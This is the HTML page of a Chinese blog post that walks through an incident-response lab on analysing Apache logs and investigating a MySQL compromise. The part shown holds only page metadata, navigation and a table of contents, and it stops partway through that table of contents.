@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01前言继续开始玄机第二章的学习 感谢师傅的wp，讲的真的很详细 玄机——第二章 日志分析-apache日志分析 wp_第二章日志分析-apache日志分析-CSDN博客 玄机——第二章 日志分析-apache日志分析 wp_第二章日志分析-apache日志分析-CSDN博客 玄机——第二章日志分析-redis应急响应 wp-CSDN博客 0x01正文第二章日志分析-apache日志分析什么是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="玄机第二章日志分析(二刷)">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="0x01前言继续开始玄机第二章的学习 感谢师傅的wp，讲的真的很详细 玄机——第二章 日志分析-apache日志分析 wp_第二章日志分析-apache日志分析-CSDN博客 玄机——第二章 日志分析-apache日志分析 wp_第二章日志分析-apache日志分析-CSDN博客 玄机——第二章日志分析-redis应急响应 wp-CSDN博客 0x01正文第二章日志分析-apache日志分析什么是">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421162558190.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421163356238.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421163842875.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421163536713.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117200431439.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421164724063.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421165214789.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421165605174.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421170314021.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117205810653.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117205931629.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117211539930.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117211713956.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117212910722.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117213252122.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117214451735.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117215044255.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117215455720.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241117215539631.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118200210465.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118200318025.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118200445702.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118201335200.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118201112284.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/c1c44daa65c04b31fcaedea8562ff80a.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118203906432.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118203939311.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118205110969.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/fbfe99f0d7aefe424eb6171737f42161.png#pic_center">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118211547724.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118211127370.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118212348752.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118212539097.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118213038940.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118213713443.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118213847088.png">
+<meta property="article:published_time" content="2025-04-21T09:10:25.000Z">
+<meta property="article:modified_time" content="2025-05-16T03:39:07.366Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="玄机第二章日志分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20250421162558190.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>玄机第二章日志分析(二刷)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/21/%E9%99%87%E5%89%91%E6%9D%AF2023wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=玄机第二章日志分析(二刷)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第二章日志分析(二刷)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=玄机第二章日志分析(二刷)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=玄机第二章日志分析(二刷)&body=Check out this article: https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第二章日志分析(二刷)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第二章日志分析(二刷)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第二章日志分析(二刷)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=玄机第二章日志分析(二刷)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=玄机第二章日志分析(二刷)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/21/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=玄机第二章日志分析(二刷)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">0x01正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">第二章日志分析-apache日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFapache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%EF%BC%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">什么是apache日志分析？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">Apache日志分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">常见日志文件位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E6%8F%90%E4%BA%A4%E5%BD%93%E5%A4%A9%E8%AE%BF%E9%97%AE%E6%AC%A1%E6%95%B0%E6%9C%80%E5%A4%9A%E7%9A%84IP%EF%BC%8C%E5%8D%B3%E9%BB%91%E5%AE%A2IP"><span class="toc-number">2.1.2.</span> <span class="toc-text">问题1:提交当天访问次数最多的IP，即黑客IP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cut%E5%92%8Ccat%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">cut和cat命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.1.3.</span> <span class="toc-text">问题2:黑客使用的浏览器指纹是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">什么是浏览器指纹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8C%87%E7%BA%B9"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">常见的指纹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">使用浏览器指纹的目的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-1"><span class="toc-number">2.1.3.4.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%983-%E6%9F%A5%E7%9C%8Bindex-php%E9%A1%B5%E9%9D%A2%E8%A2%AB%E8%AE%BF%E9%97%AE%E7%9A%84%E6%AC%A1%E6%95%B0"><span class="toc-number">2.1.4.</span> <span class="toc-text">问题3:查看index.php页面被访问的次数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">解题流程:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%984%EF%BC%9A%E6%9F%A5%E7%9C%8B%E9%BB%91%E5%AE%A2IP%E8%AE%BF%E9%97%AE%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1"><span class="toc-number">2.1.5.</span> <span class="toc-text">问题4：查看黑客IP访问了多少次</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-2"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.5.1.1.</span> <span class="toc-text">第一种命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.5.1.2.</span> <span class="toc-text">第二种命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">总结：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.5.2.1.</span> <span class="toc-text">第三个命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%985%EF%BC%9A%E6%9F%A5%E7%9C%8B2023%E5%B9%B48%E6%9C%8803%E6%97%A58%E6%97%B6%E8%BF%99%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%97%B6%E5%86%85%E6%9C%89%E5%A4%9A%E5%B0%91IP%E8%AE%BF%E9%97%AE"><span class="toc-number">2.1.6.</span> <span class="toc-text">问题5：查看2023年8月03日8时这一个小时内有多少IP访问</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-3"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%91%BD%E4%BB%A4-1"><span class="toc-number">2.1.6.1.1.</span> <span class="toc-text">第一种命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%91%BD%E4%BB%A4-1"><span class="toc-number">2.1.6.1.2.</span> <span class="toc-text">第二种命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.6.1.3.</span> <span class="toc-text">第三种命令</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">2.2.</span> <span class="toc-text">第二章日志分析-mysql应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFmysql"><span class="toc-number">2.2.1.</span> <span class="toc-text">什么是mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFmysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">2.2.2.</span> <span class="toc-text">什么是mysql应急响应</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%981%EF%BC%9A%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%99%E5%85%A5%E7%9A%84shell"><span class="toc-number">2.2.3.</span> <span class="toc-text">问题1：黑客第一次写入的shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-4"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E9%BB%91%E5%AE%A2%E5%8F%8D%E5%BC%B9shell%E7%9A%84ip"><span class="toc-number">2.2.4.</span> <span class="toc-text">问题2:黑客反弹shell的ip</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.2.4.0.1.</span> <span class="toc-text">什么是反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.4.0.2.</span> <span class="toc-text">反弹shell的原理</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">基本步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-5"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%983%EF%BC%9A%E9%BB%91%E5%AE%A2%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84"><span class="toc-number">2.2.5.</span> <span class="toc-text">问题3：黑客提权文件的完整路径</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E7%A7%8Dmysql%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.5.1.</span> <span class="toc-text">三种mysql提权攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-6"><span class="toc-number">2.2.5.2.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-UDF-%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-number">2.2.5.3.</span> <span class="toc-text">什么是 UDF 提权？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UDF-%E6%8F%90%E6%9D%83%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.5.4.</span> <span class="toc-text">UDF 提权有哪些条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E9%9C%80%E8%A6%81-UDF-%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.5.5.</span> <span 